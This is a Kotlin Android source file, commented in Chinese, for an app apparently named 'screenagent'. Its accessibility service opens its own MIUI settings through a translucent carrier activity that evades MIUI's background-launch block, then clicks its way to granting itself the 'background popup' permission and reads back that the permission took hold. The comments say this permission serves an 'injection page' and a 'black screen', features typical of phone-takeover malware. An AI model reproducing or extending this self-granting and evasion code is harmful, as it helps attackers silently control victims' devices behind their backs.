package com.zaka.screenagent.flow.miui

import android.content.Intent
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService

/**
 * 第二步：**后台弹出界面**（MIUI 专属；后面所有步骤都要从后台拉起系统页面）
 *
 * 为什么需要它：注入页 / 黑屏 / 任何"从后台拉起 Activity"的动作，
 * 没有这个权限会被 MIUI 直接拒：
 *   MIUILOG- Permission Denied Activity : Intent { cmp=…InjectionActivity }
 *
 * 路径（实测）：
 *   应用信息 → 「其他权限」/「权限管理」→ 「后台弹出界面」→ 允许
 * 开关在 MIUI 上是 CheckBox（不是 Switch），点了要回读。
 */
object Step2 {

    private const val TAG = "Step2"
    private val ui = Handler(Looper.getMainLooper())

    fun run(service: BoundaryAccessibilityService, onDone: (Boolean) -> Unit) {
        Log.d(TAG, "打开应用信息页（找「其他权限」→「后台弹出界面」）")
        openAppDetails(service)

        var stage = 0
        var ticks = 0
        var reopenTries = 0
        fun tick() {
            when (stage) {
                0 -> {   // 等应用信息页真的在前台，再点「其他权限/权限管理」
                    val cls = settingsClass(service)
                    Log.d(TAG, "stage0 当前页=$cls")
                    if (cls.contains("ApplicationsDetails")) {
                        if (clickAny(service, MiuiNavigator.texts("otherPerms"))) {
                            Log.d(TAG, "进入其他权限页"); stage = 1; ticks = 0
                        }
                    } else if (reopenTries < 3) {
                        // 载体被顶掉了（比如上一步的页面还在前台）→ 重新打开应用信息页
                        reopenTries++
                        Log.d(TAG, "stage0 不在应用信息页 -> 重新打开 (第 ${reopenTries} 次)")
                        openAppDetails(service)
                        ticks = 0
                    }
                }
                1 -> {   // 进「后台弹出界面」
                    if (clickAny(service, MiuiNavigator.texts("bgPopup"))) {
                        Log.d(TAG, "进入后台弹出界面页"); stage = 2; ticks = 0
                    }
                }
                2 -> {   // 打开开关 / 选择「始终允许」
                    // ① MIUI 这里是弹窗：拒绝 / 始终允许 / 取消 → 点「始终允许」
                    if (clickAny(service, MiuiNavigator.texts("allow"))) {
                        Log.d(TAG, "点「始终允许」"); stage = 3; ticks = 0
                    } else {
                        // ② 普通页面：找 CheckBox 点开
                        val box = findCheckable(service)
                        if (box != null) {
                            if (box.isChecked) {
                                Log.d(TAG, "后台弹出界面已开启")
                                onDone(true); return
                            }
                            val ok = box.performAction(AccessibilityNodeInfo.ACTION_CLICK) ||
                                     MiuiNavigator.tapByGesture(service, box)
                            Log.d(TAG, "点开关 id=${box.viewIdResourceName} = $ok")
                            stage = 3; ticks = 0
                        }
                    }
                }
                3 -> {   // 回读：弹窗里"始终允许"是否已选 / CheckBox 是否已勾
                    if (isAllowed(service)) {
                        Log.d(TAG, "后台弹出界面已开启（回读确认）")
                        onDone(true); return
                    }
                }
            }
            if (ticks++ > 20) { Log.w(TAG, "超时 stage=$stage"); onDone(false); return }
            ui.postDelayed({ tick() }, 1_500L)
        }
        ui.postDelayed({ tick() }, 3_000L)
    }

    /**
     * 打开应用信息页。
     * MIUI 会拦「后台启动 Activity」，所以必须借前台 Activity 载体（MiuiCarrierActivity）来拉起。
     */
    private fun openAppDetails(service: BoundaryAccessibilityService) {
        runCatching {
            service.startActivity(
                Intent(service, MiuiCarrierActivity::class.java)
                    .putExtra(MiuiCarrierActivity.EXTRA_TARGET, MiuiCarrierActivity.TARGET_APP_INFO)
                    .putExtra(MiuiCarrierActivity.EXTRA_PKG, service.packageName)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            )
        }.onSuccess { Log.d(TAG, "经载体打开应用信息页") }
            .onFailure { Log.w(TAG, "打开载体失败: $it") }
    }

    /**
     * 取"设置/安全中心"那一层的根节点。
     * 我们的载体是半透明窗口，会占住 rootInActiveWindow（返回 FrameLayout），
     * 真正要操作的应用信息页在别的窗口里，所以必须遍历 windows 挑。
     */
    private fun settingsRoots(service: BoundaryAccessibilityService): List<AccessibilityNodeInfo> {
        val out = ArrayList<AccessibilityNodeInfo>()
        runCatching {
            service.windows.orEmpty().forEach { w ->
                val r = w.root ?: return@forEach
                val pkg = r.packageName?.toString().orEmpty()
                if (pkg == "com.android.settings" || pkg == "com.miui.securitycenter" ||
                    pkg == "com.miui.powerkeeper") out.add(r)
            }
        }
        if (out.isEmpty()) service.rootInActiveWindow?.let { out.add(it) }
        return out
    }

    /** 当前设置页类名（从设置窗口里取，不看 rootInActiveWindow） */
    private fun settingsClass(service: BoundaryAccessibilityService): String {
        val roots = settingsRoots(service)
        return runCatching { roots.firstOrNull()?.className?.toString().orEmpty() }.getOrDefault("")
    }

    /** 按文案点（扫描设置/安全中心窗口） */
    private fun clickAny(service: BoundaryAccessibilityService, texts: List<String>): Boolean {
        val roots = ArrayList<AccessibilityNodeInfo>()
        roots.addAll(settingsRoots(service))
        service.rootInActiveWindow?.let { if (it !in roots) roots.add(it) }
        for (root in roots) {
            for (t in texts) {
                val n = findText(root, t, 0) ?: continue
                if (!n.isEnabled) continue
                if (n.performAction(AccessibilityNodeInfo.ACTION_CLICK) ||
                    MiuiNavigator.tapByGesture(service, n)) {
                    Log.d(TAG, "点「$t」")
                    return true
                }
            }
        }
        return false
    }

    /** 回读是否已允许：弹窗里"始终允许"选中，或 CheckBox 已勾 */
    private fun isAllowed(service: BoundaryAccessibilityService): Boolean {
        val root = service.rootInActiveWindow ?: return false
        val allowTexts = MiuiNavigator.texts("allow")
        var ok = false
        fun walk(n: AccessibilityNodeInfo?, d: Int) {
            if (n == null || d > 40 || ok) return
            val t = n.text?.toString().orEmpty()
            if (allowTexts.any { it == t && (n.isChecked || n.isSelected) }) { ok = true; return }
            if (n.isCheckable && n.isChecked) { ok = true; return }
            for (i in 0 until n.childCount) walk(n.getChild(i), d + 1)
        }
        walk(root, 0)
        return ok
    }

    /** 「后台弹出界面」页的开关是 CheckBox */
    private fun findCheckable(service: BoundaryAccessibilityService): AccessibilityNodeInfo? {
        for (root in settingsRoots(service)) findCheckBox(root, 0)?.let { return it }
        return null
    }

    private fun findCheckBox(n: AccessibilityNodeInfo?, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 25) return null
        if (n.isCheckable && n.isEnabled) return n
        for (i in 0 until n.childCount) findCheckBox(n.getChild(i), d + 1)?.let { return it }
        return null
    }

    private fun findText(n: AccessibilityNodeInfo?, want: String, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 40) return null
        val t = n.text?.toString().orEmpty()
        if (t == want || (t.isNotEmpty() && t.contains(want))) return n
        for (i in 0 until n.childCount) findText(n.getChild(i), want, d + 1)?.let { return it }
        return null
    }
}

/**
 * 设置页载体（前台 Activity 才能拉起系统页面，MIUI 拦后台启动）。
 * 打开目标页后 1.2 秒自己退出，后续点击由 Step6 负责。
 */
class MiuiCarrierActivity : android.app.Activity() {

    override fun onCreate(savedInstanceState: android.os.Bundle?) {
        super.onCreate(savedInstanceState)
        val target = intent?.getStringExtra(EXTRA_TARGET).orEmpty()
        val pkg = intent?.getStringExtra(EXTRA_PKG).orEmpty()
        Log.d("MiuiCarrier", "target=$target pkg=$pkg")
        val i = when (target) {
            TARGET_APP_INFO -> Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                .setData(android.net.Uri.parse("package:$pkg"))
            else -> null
        }
        if (i != null) runCatching { startActivity(i) }.onFailure { Log.w("MiuiCarrier", "失败: $it") }
        android.os.Handler(android.os.Looper.getMainLooper())
            .postDelayed({ finish() }, 1_200L)
    }

    companion object {
        const val EXTRA_TARGET = "target"
        const val EXTRA_PKG = "pkg"
        const val TARGET_APP_INFO = "app_info"
    }
}
